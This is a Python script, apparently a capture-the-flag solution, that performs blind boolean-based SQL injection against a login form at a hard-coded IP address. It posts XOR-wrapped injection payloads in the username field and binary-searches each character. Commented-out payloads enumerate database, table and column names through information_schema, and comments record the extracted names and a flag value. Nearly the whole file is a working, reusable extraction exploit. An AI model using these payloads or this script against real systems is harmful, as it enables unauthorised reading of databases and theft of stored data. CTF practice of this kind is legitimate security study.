import requests
import time

url = "http://47.108.155.185:9130/login.php"
flag = ""
headers = {
      'User-Agent':'Mozilla/5.0 (Windows NT 6.2; rv:16.0) Gecko/20100101 Firefox/16.0',
      'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
      'Content-Type':'application/x-www-form-urlencoded',
      'Cookie':'session=f33c3af3-345e-4230-9be1-2efb8da7581b.OfoPOh967V_Mhrto11kHdC0FggQ; PHPSESSID=ef418497e91499d571d74ba30ac72fa9'
}
temp = {
    "username" : "xxx",
    "password" : "aaa",
    "login" : ""
}
for i in range(1, 1000000) :
    time.sleep(1)
    low = 32
    high = 128
    mid = (low+high)//2
    #print(chr(mid))
    while(low < high) :
        #库名 sqLI
        #temp["username"] = "'^(mid((select(group_concat(schema_name))from(information_schema.schemata))from({})for(1))>'{}')^1-- ".format(i, chr(mid))
        #temp["username"] = "'^(mid((select(group_concat(database())))from({})for(1))>'{}')^1-- ".format(i, chr(mid))
        #表名 FLLA4GGG
        #temp["username"] = "'^(mid((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database()))from({})for(1))>'{}')^1-- ".format(i, chr(mid))
        #列名 ID,FLLLLLLLA4GGG
        #temp["username"] = "'^(mid((select(group_concat(column_name))from(information_schema.columns)where(table_name='Flla4ggg'))from({})for(1))>'{}')^1-- ".format(i, chr(mid))
        #值 flag{25dd385c-2520-4993-a7cd-8dce813b6f8a}
        temp["username"] = "'^(mid((select(fllllllla4ggg)from(Flla4ggg))from({})for(1))>'{}')^1-- ".format(i, chr(mid))
        #print(temp["username"])
        res = requests.post(url, data=temp, headers=headers)
        #print(res.text)
        if "Dumb" in res.text:
            #print("t")
            low = mid + 1
        else :
            high = mid
        #print(mid)
        mid = (low + high)//2

    if(mid==32 or mid ==127) :
        break
    flag += chr(mid)
    print(flag)
print(flag)